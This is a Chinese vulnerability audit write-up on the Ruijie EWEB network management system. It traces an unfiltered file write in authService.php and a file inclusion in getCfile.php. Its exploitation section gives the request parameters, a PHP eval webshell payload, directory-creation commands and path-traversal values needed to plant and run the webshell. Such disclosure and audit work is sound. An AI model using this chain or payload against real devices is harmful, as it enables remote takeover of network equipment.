漏洞名称：
=====

锐捷网络-EWEB网管系统文件包含漏洞

一、审计步骤：
=======

（一）查找写入文件函数：
------------

自动化审计，在这个/auth\_pi/authService.php文件下发现file\_put\_contents函数可控，跟进该文件。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d53bdea78b945b28f529b24bc13bc71b70c2006e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d53bdea78b945b28f529b24bc13bc71b70c2006e.png)  
/auth\_pi/authService.php文件的set\_authAction方法。在76行的提醒语句也说明了该info文件在user\_auth目录下,而且也未对userName进行安全过滤，这里可以任意路径创建文件。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c9db9447381617ba5aa39860d92a71e224e38bf4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c9db9447381617ba5aa39860d92a71e224e38bf4.png)  
而P方法存在于/mvc/lib/core.function.php的类里面，是用来接收POST传参。[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f23fc1756c0ef76032177995a1485f10b4b1f857.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f23fc1756c0ef76032177995a1485f10b4b1f857.png)  
利用方式：  
1：post请求  
2：请求参数a=set\_auth  
3：参数为userName、auth  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9191993e17ce3040f5b9c4f7cf65b15d0270fa24.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9191993e17ce3040f5b9c4f7cf65b15d0270fa24.png)[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ca31c7015e2e4d75edb2d3fc2fcb8f2e9e601b17.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ca31c7015e2e4d75edb2d3fc2fcb8f2e9e601b17.png)

（二）查找文件包含函数：
------------

自动化审计，在这个/local/auth/php/getCfile.php文件下发现include 函数可控，跟进该文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3114ec67f1532669ff6feb4e09b6362e993d358d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3114ec67f1532669ff6feb4e09b6362e993d358d.png)  
这个文件通过post方式传参但是并没有对cf参数进行安全过滤  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7c9bc31d2eddb2bb9d9a0fc4ec5fcd4a75f90716.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7c9bc31d2eddb2bb9d9a0fc4ec5fcd4a75f90716.png)  
利用方式：  
1：post请求  
2：必须存在tmp/user\_auth/cfile目录或者自己创建  
3：参数为cf、&amp;field=1  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b457f7d87c6c4f3b057030a3149b1ca48d2feb2f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b457f7d87c6c4f3b057030a3149b1ca48d2feb2f.png)

将文件全部放到www目录下，由于本地环境不是真实站点，所以在www目录下创建tmp文件，并创建test.info,这里说一下getCfile.php默认是找tmp/app\_auth/cfile/下的文件，所以要用../../返回到tmp根目录。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a846918a15756c349c67884e2955a782b5855ebf.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a846918a15756c349c67884e2955a782b5855ebf.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1d1df579fa6ddf50c7fb6691272bc1c6f0af7182.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1d1df579fa6ddf50c7fb6691272bc1c6f0af7182.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e27e916dd77238868e9d2b191c26d654f2bbbe6b.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e27e916dd77238868e9d2b191c26d654f2bbbe6b.png)

成功案例：
=====

步骤一：写文件
-------

利用方式：  
1：post请求/auth\_pi/authService.php  
2：请求参数a=set\_auth  
3：参数为userName、auth  
登录后抓包将任意数据包的请求路径改成，  
“/auth\_pi/authService.php?a=set\_auth”，将请求参数添加或者改成userName=tr1&amp;auth=[?php%20@eval($\_POST\['w'\]);?](mailto:?php%20@eval($_POST%5B'w'%5D);?)  
userName参数可以为任意字符，包含的时候必须为userName参数.info文件。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a32f52840e9cc8994bd00123522ebeab5425de90.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a32f52840e9cc8994bd00123522ebeab5425de90.png)

创建目录：
-----

通过（  
command=cd+tmp  
command=mkdir+app\_auth  
command=cd+app\_auth  
command=mkdir+cfile  
）命令创建tmp/app\_auth/cfile/目录

步骤二：文件包含
--------

利用方式：  
1：post请求/local/auth/php/getCfile.php  
2：请求参数cf=../../../data/userName参数.info，登录后抓包将任意数据包的请求路径改成/local/auth/php/getCfile.php，请求参数添加或者改为  
cf=../../../data/tr.info  
3：&amp;w=phpinfo();是一句话连接密码

### 注意：有时候../../../data/user\_auth/userName参数.info才能包含

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-769f72ab8d9f4efd08e3617a81ce0d53e4d593cc.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-769f72ab8d9f4efd08e3617a81ce0d53e4d593cc.png)